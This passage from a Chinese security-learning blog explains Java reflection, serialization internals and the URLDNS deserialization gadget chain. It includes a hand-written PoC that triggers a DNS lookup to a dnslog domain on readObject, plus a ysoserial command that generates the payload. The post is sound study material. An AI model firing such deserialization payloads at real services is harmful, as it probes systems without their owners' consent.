punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> declareMethods <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过getDeclaredMethods()方法获取方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>declareMethods<span class="token punctuation">)</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果如下图</p><p><img src="https://s2.loli.net/2022/03/03/5PioE2WFacpLnZ8.png" alt="image-20220211175124663"></p><p>关于代码的一些细节（没系统学过Java 流下了眼泪</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> declareMethods <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在Java中，声明数组的格式是</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">dataType<span class="token punctuation">[</span><span class="token punctuation">]</span> arrayRefVar<span class="token punctuation">;</span><span class="token comment">//首选</span><span class="token comment">//或者</span>dataType arrayRefVar<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 效果相同，但不是首选方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以在这行代码中，Method是数据类型，也就是我们需要的方法数组</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>declareMethods<span class="token punctuation">)</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是Java遍历数组常见的一种方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">double</span> element<span class="token operator">:</span> myList<span class="token punctuation">)</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="getMethods"><a href="#getMethods" class="headerlink" title="getMethods()"></a>getMethods()</h4><p>getMethods()返回某个类中的所有public方法，包括其继承类的public方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetClassName</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> name <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> methods <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getMethods()获取的方法:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> m<span class="token operator">:</span>methods<span class="token punctuation">)</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/03/03/QblcMgRmxd3JE9S.png" alt="image-20220211180432623"></p><p>上图中包含了继承类的方法</p><h2 id="Java序列化和反序列化"><a href="#Java序列化和反序列化" class="headerlink" title="Java序列化和反序列化"></a>Java序列化和反序列化</h2><h3 id="序列化与反序列化的定义"><a href="#序列化与反序列化的定义" class="headerlink" title="序列化与反序列化的定义"></a>序列化与反序列化的定义</h3><ul><li>Java序列化是将Java对象转换为字节序列的行为</li><li>Java反序列化即序列化的反向操作，将字节序列恢复为对象的过程</li></ul><h3 id="序列化与反序列化的具体代码实现"><a href="#序列化与反序列化的具体代码实现" class="headerlink" title="序列化与反序列化的具体代码实现"></a>序列化与反序列化的具体代码实现</h3><ul><li>在ObjectOutputStream 中使用 writeObject 方法，将对象以二进制格式进行写入</li><li>在ObjectInputStream 中使用 readObject 方法，从输入流中读取二进制流，转换成对象</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Customer</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">long</span> serialVersionUID<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">String</span> sex<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token class-name">String</span> sex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">MessageFormat</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SerializeDemo</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">SerializeCustomer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Customer</span> customer <span class="token operator">=</span> <span class="token class-name">DeserializeCustomer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">MessageFormat</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"age:{0}, name:{1}, sex:{2}"</span><span class="token punctuation">,</span>customer<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>customer<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>customer<span class="token punctuation">.</span><span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">SerializeCustomer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>        <span class="token class-name">Customer</span> customer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Customer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customer<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customer<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        customer<span class="token punctuation">.</span><span class="token function">setSex</span><span class="token punctuation">(</span><span class="token string">"male"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>        <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Administrator\\customer"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>customer<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">static</span> <span class="token class-name">Customer</span> <span class="token class-name">DeserializeCustomer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\Administrator\\customer"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Customer</span> customer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Customer</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> customer<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/03/03/jXWGatHFhBx4i9y.png" alt="image-20220225104740882"></p><ul><li><code>0xaced</code>:魔术头</li><li><code>0x0005</code>:版本号</li><li><code>0x73</code>，对象类型标识 <em>（<code>0x7n</code>基本上都定义了类型标识符常量，但也要看出现的位置，毕竟它们都在可见字符的范围，详见<code>java.io.ObjectStreamConstants</code>）</em></li><li><code>0x72</code>，类描述符标识</li><li><code>0x0008...</code>，类名字符串长度和值 <em>（Java序列化中的UTF8格式标准）</em></li><li><code>0xac7ba91da37b53e5</code>，序列版本唯一标识 <em>（<code>serialVersionUID</code>，简称SUID）</em></li><li><code>0x02</code>，对象的序列化属性标志位，如是否是Block Data模式、自定义<code>writeObject()</code>，<code>Serializable</code>、<code>Externalizable</code>或<code>Enum</code>类型等</li><li><code>0x0003</code>，类的字段个数</li><li><code>0x49</code>，整数类型签名的第一个字节，同理，之后的<code>0x4c</code>为字符串类型签名的第一个字节 <em>（类型签名表示与JVM规范中的定义相同）</em></li><li><code>0x0003...</code>，字段名字符串长度和值，非原始数据类型的字段还会在后面加上数据类型标识、完整类型签名长度和值，如之后的<code>0x4c0003...</code></li><li><code>0x78</code> Block Data结束标识</li><li><code>0x70</code> 父类描述符标识，此处为<code>null</code></li></ul><h3 id="SerialVersionUID"><a href="#SerialVersionUID" class="headerlink" title="SerialVersionUID"></a>SerialVersionUID</h3><p>serialVersionUID适用于java序列化机制。简单来说，JAVA序列化的机制是通过 判断类的serialVersionUID来验证的版本一致的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID于本地相应实体类的serialVersionUID进行比较。如果相同说明是一致的，可以进行反序列化，否则会出现反序列化版本一致的异常，即是InvalidCastException。</p><p><strong>具体序列化的过程：</strong></p><p>序列化操作时会把系统当前类的serialVersionUID写入到序列化文件中，当反序列化时系统会自动检测文件中的serialVersionUID，判断它是否与当前类中的serialVersionUID一致。如果一致说明序列化文件的版本与当前类的版本是一样的，可以反序列化成功，否则就失败；</p><p><strong>serialVersionUID有两种显示的生成方式：</strong>一是默认的1L，比如：</p><pre class="line-numbers language-none"><code class="language-none">privatestaticfinallong serialVersionUID = 1L;    <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>二是根据包名，类名，继承关系，非私有的方法和属性，以及参数，返回值等诸多因子计算得出的，极度复杂生成的一个64位的哈希字段。基本上计算出来的这个值是唯一的。比如：</p><pre class="line-numbers language-none"><code class="language-none">privatestaticfinallong serialVersionUID = xxxxL;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="演示（URLDNS）"><a href="#演示（URLDNS）" class="headerlink" title="演示（URLDNS）"></a>演示（URLDNS）</h3><p>poc测试代码：URLDNS.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">URLDNSTest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> URLDNS <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token comment">//0x01.生成payload</span>        <span class="token comment">//设置一个hashMap</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span>URL<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置我们可以接受DNS查询的地址，这里使用的是dnslog</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://ch16ri.dnslog.cn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//将URL的hashCode字段设置为允许修改</span>        <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//**以下的蜜汁操作是为了不在put中触发URLDNS查询，如果不这么写就会触发两次（之后会解释）**</span>        <span class="token comment">//1. 设置url的hashCode字段为0xdeadbeef（随意的值）</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2. 将url放入hashMap中，右边参数随便写</span>        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token string">"m1yuu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//修改url的hashCode字段为-1，为了触发DNS查询（之后会解释）</span>        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//0x02.写入文件模拟网络传输</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//0x03.读取文件，进行反序列化触发payload</span>        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/03/03/hqtAv9LgE7lseFD.png"></p><h4 id="About-HashMap"><a href="#About-HashMap" class="headerlink" title="About HashMap"></a>About <strong>HashMap</strong></h4><blockquote><p>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。</p><p>HashMap 实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。</p><p>HashMap 是无序的，即不会记录插入的顺序。</p><p>HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。</p></blockquote><p><img src="https://www.runoob.com/wp-content/uploads/2020/07/WV9wXLl.png" alt="img"></p><p><a href="https://www.runoob.com/java/java-hashmap.html">https://www.runoob.com/java/java-hashmap.html</a></p><h4 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h4><p><code>java.util.HashMap#writeObject</code>分为三个步骤进行序列化：</p><blockquote><p>1.序列化写入一维数组的长度（不是特别确定，但是这个值在反序列化中是不使用的，所以不太重要）</p><p>2.序列化写入键值对的个数</p><p>3.序列化写入键值对的键和值；</p></blockquote><p>在HashMap.java中可以看到HashMap类拓展了序列化的接口。我们定位到readObject的位置，在putval方法的位置下断点</p><p><code>putVal</code>是往HashMap中放入键值对的方法</p><p><img src="https://s2.loli.net/2022/03/06/D1vh6FBE3uCpMX2.png" alt="image-20220306193549799"></p><p>跟进，看到hash函数方法传入的key是我们目标url对象</p><p><img src="https://s2.loli.net/2022/03/06/YShNqQI5AdPZJvO.png" alt="image-20220306193754384"></p><p>继续跟进，跟到hashCode()方法，可以看到下面进行了<code>InetAddress addr = getHostAddress(u);</code>，成功触发。所以调用路线即为</p><blockquote><p>HashMap-&gt;readObject()-&gt;hash()-&gt;URL.class-&gt;hashcode()-&gt;UrlStreamHandler.class-&gt;hashcode()-&gt;InetAddress addr = getHostAddress(u);</p></blockquote><p>所以我们要执行的是的是URL查询的方法<code>URL-&gt;hashCode()</code>。</p><h4 id="使用ysoserial生成文件并且触发"><a href="#使用ysoserial生成文件并且触发" class="headerlink" title="使用ysoserial生成文件并且触发"></a>使用ysoserial生成文件并且触发</h4><h5 id="安装ysoserial"><a href="#安装ysoserial" class="headerlink" title="安装ysoserial"></a>安装ysoserial</h5><p>github仓库地址：<a href="https://github.com/frohoff/ysoserial.git">https://github.com/frohoff/ysoserial.git</a></p><p>两种安装方式：</p><ul><li>使用下载源码之后使用maven进行编译，便于在本地进行调试</li><li>直接下载jar包 <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></li></ul><h5 id="生成文件out-bin"><a href="#生成文件out-bin" class="headerlink" title="生成文件out.bin"></a>生成文件out.bin</h5><p>首先去dnslog获取get subdomain，在jar包存在的文件夹下（本地使用maven编译后的jar包所在文件夹为*/ysoserial/target）运行如下：</p><p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://lwkjw8.dnslog.cn &gt; out.bin</code></p><p>使用hexdump查看out.bin内容：</p><img src="https://s2.loli.net/2022/03/11/tmaMOTbo27pW8JN.png" alt="image-20220311092228696" style="zoom:50%;"><h5 id="编写反序列化代码"><a href="#编写反序列化代码" class="headerlink" title="编写反序列化代码"></a>编写反序列化代码</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span>URLDNS<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URLDNSTest</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/Users/m1saka/tools/ysoserial/target/out.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> bit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fis<span class="token punctuation">)</span><span class="token punctuation">;</span>        bit<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行成功后可在dnslog平台看到记录。</p><p><img src="https://s2.loli.net/2022/03/11/2ykeQBtpELsi7FW.png" alt="image-20220311092618714"></p><p>在ysoserial的URLDNS.java文件中，注释也展示出了反序列化所利用的链：</p><img src="https://s2.loli.net/2022/03/11/ckoIxs6f2igSvKT.png" alt="image-20220311093123597" style="zoom:50%;">]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> java web </tag>
            
            <tag> poc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp sql注入分析</title>
      <link href="/2021/10/25/thinkphp-sqli/"/>
      <url>/2021/10/25/thinkphp-sqli/</url>
      
